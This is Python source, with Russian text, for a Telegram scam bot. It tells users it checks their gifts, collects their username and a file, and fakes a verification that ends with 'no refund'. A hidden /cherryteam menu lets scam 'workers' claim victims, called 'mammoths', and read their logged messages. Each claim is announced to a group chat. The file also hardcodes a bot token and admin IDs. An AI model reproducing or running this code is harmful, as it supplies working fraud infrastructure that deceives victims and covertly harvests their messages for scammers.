import os
import asyncio
import sys
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

print("=== БОТ ЗАПУСКАЕТСЯ ===")

# Конфиг
BOT_TOKEN = "8092588180:AAGJR1QrIqLgWBmZNxHEqb9f-Ou3YqLts7U"
GROUP_CHAT_ID = "4866741254"
ADMIN_IDS = {7662948442, 6802842517, 913595126}

# Хранилище
users_db = {}
mammoths_db = {}
messages_db = {}
banned_users = set()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text("❌ Ты в бане")
        return
        
    users_db[user_id] = {
        "username": update.effective_user.username or "",
        "step": "need_username"
    }
    
    if user_id not in messages_db:
        messages_db[user_id] = []
    
    messages_db[user_id].append({"text": "/start", "time": datetime.now()})
    
    await update.message.reply_text(
        "Привет! Проверяем подарки.\n\n"
        "1. Скинь username без @\n" 
        "2. Затем файл"
    )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id in banned_users:
        await update.message.reply_text("❌ Ты в бане")
        return
        
    if user_id not in messages_db:
        messages_db[user_id] = []
    messages_db[user_id].append({"text": text, "time": datetime.now()})
    
    if user_id in users_db and users_db[user_id].get("step") == "need_username":
        if "@" in text:
            await update.message.reply_text("❌ Без @")
            return
            
        users_db[user_id]["username"] = text
        users_db[user_id]["step"] = "need_file"
        await update.message.reply_text("✅ Юзернейм принят! Теперь файл.")
    
    elif user_id in users_db and users_db[user_id].get("step") == "awaiting_mammoth":
        await bind_mammoth(update, context, text)

async def bind_mammoth(update: Update, context: ContextTypes.DEFAULT_TYPE, identifier: str):
    user_id = update.effective_user.id
    
    try:
        mammoth_id = None
        
        if identifier.isdigit():
            mammoth_id = int(identifier)
        else:
            for uid, data in users_db.items():
                if data.get("username", "").lower() == identifier.lower():
                    mammoth_id = uid
                    break
        
        if not mammoth_id:
            await update.message.reply_text("❌ Мамонт не найден")
            return
        
        if mammoth_id not in messages_db:
            await update.message.reply_text("❌ Мамонт не нажимал /start")
            return
        
        if user_id not in mammoths_db:
            mammoths_db[user_id] = []
        
        if mammoth_id not in mammoths_db[user_id]:
            mammoths_db[user_id].append(mammoth_id)
        
        users_db[user_id]["step"] = "ready"
        await update.message.reply_text("✅ Мамонт привязан!")
        
        worker_name = users_db.get(user_id, {}).get("username", "Unknown")
        mammoth_name = users_db.get(mammoth_id, {}).get("username", "Unknown")
        
        try:
            await context.bot.send_message(
                GROUP_CHAT_ID,
                f"Воркер @{worker_name} привязал мамонта @{mammoth_name}"
            )
        except:
            pass
        
    except Exception as e:
        await update.message.reply_text("❌ Ошибка при привязке")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text("❌ Ты в бане")
        return
        
    if user_id in users_db and users_db[user_id].get("step") == "need_file":
        await update.message.reply_text("Файл принят! Проверяем...")
        await asyncio.sleep(4)
        await update.message.reply_text("✅ Проверка окончена! Рефаунда нет.")
        users_db[user_id]["step"] = "done"

async def cherryteam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("ПРИВЯЗАТЬ МАМОНТА 🦣", callback_data="bind_mammoth")],
        [InlineKeyboardButton("МОИ МАМОНТЫ", callback_data="my_mammoths")]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Родной мигрантик! Добро в TDTTEAM!\n"
        "Цепляй мамонта по айди или юзеру.",
        reply_markup=markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "bind_mammoth":
        if user_id not in users_db:
            users_db[user_id] = {}
        users_db[user_id]["step"] = "awaiting_mammoth"
        
        await query.edit_message_text(
            "Отправь username или ID мамонта в чат\n"
            "Важно: мамонт должен нажать /start в боте!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")]])
        )
        
    elif data == "my_mammoths":
        if user_id in mammoths_db and mammoths_db[user_id]:
            keyboard = []
            for mammoth_id in mammoths_db[user_id]:
                mammoth_name = users_db.get(mammoth_id, {}).get("username", "Unknown")
                keyboard.append([InlineKeyboardButton(
                    f"🦣 {mammoth_name}", 
                    callback_data=f"view_{mammoth_id}"
                )])
            
            keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")])
            markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text("Твои мамонты:", reply_markup=markup)
        else:
            await query.edit_message_text(
                "Нет привязанных мамонтов",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")]])
            )
            
    elif data == "back_to_main":
        keyboard = [
            [InlineKeyboardButton("ПРИВЯЗАТЬ МАМОНТА 🦣", callback_data="bind_mammoth")],
            [InlineKeyboardButton("МОИ МАМОНТЫ", callback_data="my_mammoths")]
        ]
        markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "Родной мигрантик! Добро в TDTTEAM!\nЦепляй мамонта по айди или юзеру.",
            reply_markup=markup
        )
    
    elif data.startswith("view_"):
        mammoth_id = int(data.split("_")[1])
        
        if mammoth_id in messages_db:
            messages_text = "Сообщения мамонта:\n\n"
            for msg in messages_db[mammoth_id][-10:]:
                time_str = msg["time"].strftime("%H:%M")
                messages_text += f"[{time_str}] {msg['text']}\n"
            
            await query.edit_message_text(
                messages_text,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="my_mammoths")]])
            )
        else:
            await query.edit_message_text(
                "Нет сообщений",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="my_mammoths")]])
            )

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Не админ")
        return
        
    if not context.args:
        await update.message.reply_text("❌ /ban USER_ID")
        return
        
    try:
        target_id = int(context.args[0])
        banned_users.add(target_id)
        await update.message.reply_text(f"✅ Забанил {target_id}")
    except:
        await update.message.reply_text("❌ Неверный ID")

async def main():
    print("🤖 ИНИЦИАЛИЗАЦИЯ БОТА...")
    
    try:
        # Создаем приложение с параметрами против конфликтов
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Добавляем обработчики
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("cherryteam", cherryteam)) 
        app.add_handler(CommandHandler("ban", ban))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
        app.add_handler(MessageHandler(filters.ATTACHMENT, handle_file))
        app.add_handler(CallbackQueryHandler(button_handler))
        
        print("✅ Бот настроен!")
        print("🚀 ЗАПУСКАЕМ POLLING...")
        
        # Запускаем с защитой от конфликтов
        await app.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        
    except Exception as e:
        print(f"💥 КРИТИЧЕСКАЯ ОШИБКА: {e}")
        sys.exit(1)  # Выходим полностью, а не перезапускаем

if __name__ == "__main__":
    asyncio.run(main())
